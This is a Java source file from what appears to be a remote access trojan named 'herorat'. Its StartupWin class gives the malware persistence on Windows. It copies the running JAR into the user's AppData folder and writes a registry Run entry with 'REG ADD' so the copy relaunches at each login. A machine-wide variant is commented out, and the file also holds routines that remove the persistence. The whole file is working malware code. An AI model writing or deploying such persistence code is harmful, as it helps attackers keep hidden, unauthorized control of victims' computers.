package net.herorat.features.startup;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

import net.herorat.utils.Logger;

public class StartupWin
{
	private static final String APPDATA = System.getenv("appdata");
	private static final String SUBFOLDER = "";
	private static final String JAVABIN = System.getProperty("java.home") + "\\bin\\javaw.exe";
//	private static final String REGENTRY1 = "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	private static final String REGENTRY2 = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	
	public static void add(String entry_name)
	{
		if (isAlreadyAdded(entry_name)) return;
		
		try
		{
			File currentJar = new File(StartupWin.class.getProtectionDomain().getCodeSource().getLocation().toURI());
			
			directoryInjection(entry_name, currentJar);	
			registryInjection(entry_name, currentJar);
		}
		catch (Exception e) {
			Logger.log("Couln't Inject file or registry \n",e);
		}
	}
	
	public static void remove(String entry_name)
	{
		try
		{
			File currentJar = new File(StartupWin.class.getProtectionDomain().getCodeSource().getLocation().toURI());
		
			removeRegistry(entry_name);
			removeDirectory(entry_name, currentJar);
		}
		catch (Exception e) {
			Logger.log("Couln't remove file or registry \n",e);
		}
	}
	
	private static boolean isAlreadyAdded(String entry_name)
	{
		File folder = new File(APPDATA, SUBFOLDER + "\\" + entry_name);
		File folder2 = new File(APPDATA, SUBFOLDER + "\\" + entry_name + ".jar");
		return folder.exists() || folder2.exists();
	}
	
	private static void directoryInjection(String entry_name, File currentJar)
	{
		try
		{					
			File outputJar = new File(APPDATA, SUBFOLDER + "\\" + currentJar.getName());

			InputStream in = new FileInputStream(currentJar);
			OutputStream out = new FileOutputStream(outputJar);
			
			byte[] buf = new byte[1024];
			int len;
			while ((len = in.read(buf)) > 0)
			{
				out.write(buf, 0, len);
			}
			in.close();
			out.close();
		}
		catch (Exception e) {
			Logger.log("Couln't Inject file registry \n",e);
		}
	}
	
	private static void removeDirectory(String entry_name, File currentJar)
	{		
		File appdata_jar = new File(APPDATA, SUBFOLDER + "\\" + currentJar.getName());
		if (appdata_jar.exists()) appdata_jar.delete();
	}
	
	private static void registryInjection(String entry_name, File currentJar)
	{
		try
		{
			File outputJar = new File(APPDATA, SUBFOLDER + "\\" + currentJar.getName());
			String start_cmd = JAVABIN + " -jar " + outputJar.getAbsolutePath();
			
//			ProcessBuilder pb = new ProcessBuilder(new String[]{"REG", "ADD", REGENTRY1, "/v", entry_name, "/d", "\"" + start_cmd + "\"", "/f"});
//			pb.start();
			ProcessBuilder pb2 = new ProcessBuilder("REG", "ADD", REGENTRY2, "/v", entry_name, "/d", "\"" + start_cmd + "\"", "/f");
			pb2.start();
		}
		catch (Exception e) {
			Logger.log("Couln't Inject registry \n",e);
		}
	}
	
	private static void removeRegistry(String entry_name)
	{
		try
		{
//			ProcessBuilder pb = new ProcessBuilder(new String[]{"REG", "DELETE", REGENTRY1, "/v", entry_name, "/f"});
//			pb.start();
			ProcessBuilder pb2 = new ProcessBuilder("REG", "DELETE", REGENTRY2, "/v", entry_name, "/f");
			pb2.start();
		}
		catch (Exception e) {
			Logger.log("Couln't remove registry \n",e);
		}
	}
}